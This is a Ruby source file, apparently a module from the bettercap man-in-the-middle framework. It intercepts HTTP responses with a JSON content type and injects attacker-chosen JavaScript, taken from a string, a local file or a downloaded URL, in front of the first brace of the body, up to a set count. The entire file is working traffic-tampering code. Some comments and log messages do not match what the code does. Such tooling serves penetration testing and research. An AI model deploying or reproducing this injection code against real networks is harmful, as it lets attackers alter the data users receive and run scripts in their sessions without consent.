# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

require 'open-uri'

# This proxy module will take care of JSON code injection.
class InjectJSON < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'InjectJSON',
    'Description' => 'This proxy module will take care of JSON code injection to JSON response.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  # JS data to be injected.
  @@jsdata = nil
  # JS file URL to be injected.
  @@jsurl  = nil
  # Maximum number of times to inject.
  @@max = 1000000
  # Counter for the number of injections.
  @@cnt = 0

  # Add custom command line arguments to the +opts+ OptionParser instance.
  def self.on_options(opts)
    opts.separator ""
    opts.separator "Inject JSON Proxy Module Options:"
    opts.separator ""

    opts.on( '--js-data STRING', 'Javascript code to be injected.' ) do |v|
      @@jsdata = v
    end

    opts.on( '--js-file PATH', 'Path of the javascript file to be injected.' ) do |v|
      filename = File.expand_path v
      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
      @@jsdata = File.read( filename )
    end

    opts.on( '--js-url URL', 'URL the javascript file to be injected.' ) do |v|
      jsonurl = v 
      @@jsdata = open(jsonurl){|io|io.read}
    end

    opts.on( '--js-max NUM', 'Maximum number of times to inject.' ) do |v|
      @@max = v.to_i
    end
  end

  # Create an instance of this module and raise a BetterCap::Error if command
  # line arguments weren't correctly specified.
  def initialize
    raise BetterCap::Error, "No --js-file, --js-url or --js-data options specified for the proxy module." if @@jsdata.nil? and @@jsurl.nil?
  end

  # Called by the BetterCap::Proxy::HTTP::Proxy processor on each HTTP +request+ and
  # +response+.
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^application\/json.*/ and ( @@cnt < @@max )
      @@cnt += 1
      BetterCap::Logger.info "[#{'INJECTJSON'.green}] Injecting JSON #{@@jsdata.nil?? "URL" : "file"} into #{request.to_url}"
      # inject data
      replacement = "#{@@jsdata}{"
      response.body.sub!( /\{/i ) { replacement }
    end
  end
end
